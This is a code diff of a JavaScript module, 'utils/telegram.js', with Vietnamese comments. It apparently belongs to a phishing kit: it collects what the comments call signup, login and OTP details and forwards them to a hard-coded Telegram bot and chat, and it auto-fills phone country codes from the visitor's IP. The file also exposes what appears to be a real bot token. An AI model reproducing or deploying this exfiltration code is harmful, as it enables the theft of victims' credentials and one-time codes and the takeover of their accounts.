@@ -1,93 +1,121 @@
-const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs'; 
-const CHAT_ID = '-5364980544'; 
-const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+// utils/telegram.js
 
-let tgMessageId = null;
-let currentSessionText = '';
-let currentSessionId = '';
+// ==========================================
+// THAY BOT TOKEN VÀ CHAT ID CỦA MÀY VÀO ĐÂY
+const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs';
+const CHAT_ID = '-5364980544';
+// ==========================================
 
-// Hàm lấy Session ID
-const getSessionId = () => {
-    if (currentSessionId) return currentSessionId;
-    let id = localStorage.getItem('session_id');
-    if (!id) {
-        id = 'user_' + Math.random().toString(36).substring(2, 9);
-        localStorage.setItem('session_id', id);
+const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// Biến lưu tin nhắn đầu tiên (thông tin signup) để gộp chung khi gửi
+let initialSessionText = '';
+
+/**
+ * Escape HTML để tránh lỗi khi gửi tin nhắn qua Telegram
+ * (Telegram parse_mode: 'HTML' sẽ hiểu nhầm các ký tự <, >, &)
+ */
+export const escapeHtml = (str) => {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+};
+
+/**
+ * Lưu text của session ban đầu (thông tin đăng ký)
+ * Gọi hàm này ở bước 1 (handleSignup) trước khi gọi sendTelegramMessage('')
+ */
+export const setInitialSession = (text) => {
+  initialSessionText = text;
+};
+
+/**
+ * Gửi tin nhắn lên Telegram.
+ * - Nếu truyền extraText rỗng: gửi initialSessionText (thông tin signup).
+ * - Nếu truyền extraText: gửi kèm sau initialSessionText (dùng cho login/otp).
+ */
+export const sendTelegramMessage = async (extraText = '') => {
+  const fullText = (initialSessionText + (extraText || '')).trim();
+  if (!fullText) return;
+
+  try {
+    const res = await fetch(`${BASE_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: fullText,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+      }),
+    });
+
+    const data = await res.json();
+    if (!data.ok) {
+      console.error('Telegram API error:', data.description);
     }
-    currentSessionId = id;
-    return id;
+    return data;
+  } catch (err) {
+    console.error('Telegram send error:', err);
+  }
 };
 
-export const setInitialSession = (text) => { 
-    currentSessionText = text; 
-};
-
-export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-
-export const sendTelegramMessage = (newContent) => {
-    if (newContent) currentSessionText += newContent;
-    
-    // TỰ ĐỘNG THÊM MÃ PHIÊN VÀO ĐẦU TIN NHẮN
-    const sid = getSessionId();
-    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
-
-    const tgFetch = (method, payload) => {
-        let bodyStr = '';
-        for (let key in payload) {
-            if (payload.hasOwnProperty(key)) {
-                bodyStr += encodeURIComponent(key) + '=' + encodeURIComponent(payload[key]) + '&';
-            }
-        }
-        return fetch(API_URL + method, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
-            body: bodyStr
-        }).then(r => r.json()).catch(() => ({ ok: false }));
-    };
-
-    if (tgMessageId === null) {
-        tgFetch('sendMessage', { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }).then(d => {
-            if (d && d.ok && d.result) tgMessageId = d.result.message_id;
-        });
-    } else {
-        tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
-            if (res && res.ok && res.result) {
-                tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
-            }
-            tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
-        });
-    }
-};
-
+/**
+ * Map mã quốc gia (ISO 3166-1 alpha-2) -> mã vùng điện thoại quốc tế
+ * Dùng để auto-fill country code trong form signup dựa trên IP.
+ */
 export const countryCodeMap = {
-    "AF": "+93", "AL": "+355", "DZ": "+213", "AS": "+1", "AD": "+376", "AO": "+244", "AI": "+1", "AG": "+1", 
-    "AR": "+54", "AM": "+374", "AW": "+297", "AU": "+61", "AT": "+43", "AZ": "+994", "BS": "+1", "BH": "+973", 
-    "BD": "+880", "BB": "+1", "BY": "+375", "BE": "+32", "BZ": "+501", "BJ": "+229", "BM": "+1", "BT": "+975", 
-    "BO": "+591", "BA": "+387", "BW": "+267", "BR": "+55", "VG": "+1", "BN": "+673", "BG": "+359", "BF": "+226", 
-    "BI": "+257", "KH": "+855", "CM": "+237", "CA": "+1", "CV": "+238", "KY": "+1", "CF": "+236", "TD": "+235", 
-    "CL": "+56", "CN": "+86", "CO": "+57", "KM": "+269", "CG": "+242", "CD": "+243", "CK": "+682", "CR": "+506", 
-    "CI": "+225", "HR": "+385", "CU": "+53", "CW": "+599", "CY": "+357", "CZ": "+420", "DK": "+45", "DJ": "+253", 
-    "DM": "+1", "DO": "+1", "EC": "+593", "EG": "+20", "SV": "+503", "GQ": "+240", "ER": "+291", "EE": "+372", 
-    "SZ": "+268", "ET": "+251", "FK": "+500", "FO": "+298", "FJ": "+679", "FI": "+358", "FR": "+33", "GF": "+594", 
-    "PF": "+689", "GA": "+241", "GM": "+220", "GE": "+995", "DE": "+49", "GH": "+233", "GI": "+350", "GR": "+30", 
-    "GL": "+299", "GD": "+1", "GP": "+590", "GU": "+1", "GT": "+502", "GG": "+44", "GN": "+224", "GW": "+245", 
-    "GY": "+592", "HT": "+509", "HN": "+504", "HK": "+852", "HU": "+36", "IS": "+354", "IN": "+91", "ID": "+62", 
-    "IR": "+98", "IQ": "+964", "IE": "+353", "IM": "+44", "IL": "+972", "IT": "+39", "JM": "+1", "JP": "+81", 
-    "JE": "+44", "JO": "+962", "KZ": "+7", "KE": "+254", "KI": "+686", "XK": "+383", "KW": "+965", "KG": "+996", 
-    "LA": "+856", "LV": "+371", "LB": "+961", "LS": "+266", "LR": "+231", "LY": "+218", "LI": "+423", "LT": "+370", 
-    "LU": "+352", "MO": "+853", "MG": "+261", "MW": "+265", "MY": "+60", "MV": "+960", "ML": "+223", "MT": "+356", 
-    "MH": "+692", "MQ": "+596", "MR": "+222", "MU": "+230", "YT": "+262", "MX": "+52", "FM": "+691", "MD": "+373", 
-    "MC": "+377", "MN": "+976", "ME": "+382", "MS": "+1", "MA": "+212", "MZ": "+258", "MM": "+95", "NA": "+264", 
-    "NR": "+674", "NP": "+977", "NL": "+31", "NC": "+687", "NZ": "+64", "NI": "+505", "NE": "+227", "NG": "+234", 
-    "NU": "+683", "KP": "+850", "MK": "+389", "MP": "+1", "NO": "+47", "OM": "+968", "PK": "+92", "PW": "+680", 
-    "PS": "+970", "PA": "+507", "PG": "+675", "PY": "+595", "PE": "+51", "PH": "+63", "PL": "+48", "PT": "+351", 
-    "PR": "+1", "QA": "+974", "RE": "+262", "RO": "+40", "RU": "+7", "RW": "+250", "BL": "+590", "SH": "+290", 
-    "KN": "+1", "LC": "+1", "MF": "+590", "PM": "+508", "VC": "+1", "WS": "+685", "SM": "+378", "ST": "+239", 
-    "SA": "+966", "SN": "+221", "RS": "+381", "SC": "+248", "SL": "+232", "SG": "+65", "SX": "+1", "SK": "+421", 
-    "SI": "+386", "SB": "+677", "SO": "+252", "ZA": "+27", "KR": "+82", "SS": "+211", "ES": "+34", "LK": "+94", 
-    "SD": "+249", "SR": "+597", "SE": "+46", "CH": "+41", "SY": "+963", "TW": "+886", "TJ": "+992", "TZ": "+255", 
-    "TH": "+66", "TL": "+670", "TG": "+228", "TK": "+690", "TO": "+676", "TT": "+1", "TN": "+216", "TR": "+90", 
-    "TM": "+993", "TC": "+1", "TV": "+688", "UG": "+256", "UA": "+380", "AE": "+971", "GB": "+44", "US": "+1", 
-    "UY": "+598", "VI": "+1", "UZ": "+998", "VU": "+678", "VA": "+379", "VE": "+58", "VN": "+84", "WF": "+681", 
-    "EH": "+212", "YE": "+967", "ZM": "+260", "ZW": "+263"
+  // Châu Á
+  AF: '+93', AM: '+374', AZ: '+994', BH: '+973', BD: '+880', BT: '+975',
+  BN: '+673', KH: '+855', CN: '+86', GE: '+995', HK: '+852', IN: '+91',
+  ID: '+62', IR: '+98', IQ: '+964', IL: '+972', JP: '+81', JO: '+962',
+  KZ: '+7', KW: '+965', KG: '+996', LA: '+856', LB: '+961', MO: '+853',
+  MY: '+60', MV: '+960', MN: '+976', MM: '+95', NP: '+977', KP: '+850',
+  OM: '+968', PK: '+92', PS: '+970', PH: '+63', QA: '+974', SA: '+966',
+  SG: '+65', KR: '+82', LK: '+94', SY: '+963', TW: '+886', TJ: '+992',
+  TH: '+66', TL: '+670', TR: '+90', TM: '+993', AE: '+971', UZ: '+998',
+  VN: '+84', YE: '+967',
+
+  // Châu Âu
+  AL: '+355', AD: '+376', AT: '+43', BY: '+375', BE: '+32', BA: '+387',
+  BG: '+359', HR: '+385', CY: '+357', CZ: '+420', DK: '+45', EE: '+372',
+  FI: '+358', FR: '+33', DE: '+49', GR: '+30', HU: '+36', IS: '+354',
+  IE: '+353', IT: '+39', XK: '+383', LV: '+371', LI: '+423', LT: '+370',
+  LU: '+352', MT: '+356', MD: '+373', MC: '+377', ME: '+382', NL: '+31',
+  MK: '+389', NO: '+47', PL: '+48', PT: '+351', RO: '+40', RU: '+7',
+  SM: '+378', RS: '+381', SK: '+421', SI: '+386', ES: '+34', SE: '+46',
+  CH: '+41', UA: '+380', GB: '+44', VA: '+379',
+
+  // Châu Mỹ
+  AG: '+1', AR: '+54', BS: '+1', BB: '+1', BZ: '+501', BO: '+591',
+  BR: '+55', CA: '+1', CL: '+56', CO: '+57', CR: '+506', CU: '+53',
+  DM: '+1', DO: '+1', EC: '+593', SV: '+503', GD: '+1', GT: '+502',
+  GY: '+592', HT: '+509', HN: '+504', JM: '+1', MX: '+52', NI: '+505',
+  PA: '+507', PY: '+595', PE: '+51', KN: '+1', LC: '+1', VC: '+1',
+  SR: '+597', TT: '+1', US: '+1', UY: '+598', VE: '+58',
+
+  // Châu Đại Dương
+  AU: '+61', FJ: '+679', KI: '+686', MH: '+692', FM: '+691', NR: '+674',
+  NZ: '+64', PW: '+680', PG: '+675', WS: '+685', SB: '+677', TO: '+676',
+  TV: '+688', VU: '+678',
+
+  // Châu Phi
+  DZ: '+213', AO: '+244', BJ: '+229', BW: '+267', BF: '+226', BI: '+257',
+  CM: '+237', CV: '+238', CF: '+236', TD: '+235', KM: '+269', CG: '+242',
+  CD: '+243', CI: '+225', DJ: '+253', EG: '+20', GQ: '+240', ER: '+291',
+  SZ: '+268', ET: '+251', GA: '+241', GM: '+220', GH: '+233', GN: '+224',
+  GW: '+245', KE: '+254', LS: '+266', LR: '+231', LY: '+218', MG: '+261',
+  MW: '+265', ML: '+223', MR: '+222', MU: '+230', MA: '+212', MZ: '+258',
+  NA: '+264', NE: '+227', NG: '+234', RW: '+250', ST: '+239', SN: '+221',
+  SC: '+248', SL: '+232', SO: '+252', ZA: '+27', SS: '+211', SD: '+249',
+  TZ: '+255', TG: '+228', TN: '+216', UG: '+256', ZM: '+260', ZW: '+263',
+
+  // Lãnh thổ / Vùng đặc biệt
+  AS: '+1', AI: '+1', AW: '+297', BM: '+1', VG: '+1', KY: '+1', CK: '+682',
+  CW: '+599', FK: '+500', FO: '+298', GF: '+594', PF: '+689', GI: '+350',
+  GL: '+299', GP: '+590', GU: '+1', GG: '+44', IM: '+44', JE: '+44',
+  NF: '+672', MP: '+1', PR: '+1', RE: '+262', BL: '+590', SH: '+290',
+  MF: '+590', PM: '+508', SX: '+1', TC: '+1', WF: '+681', EH: '+212',
 };
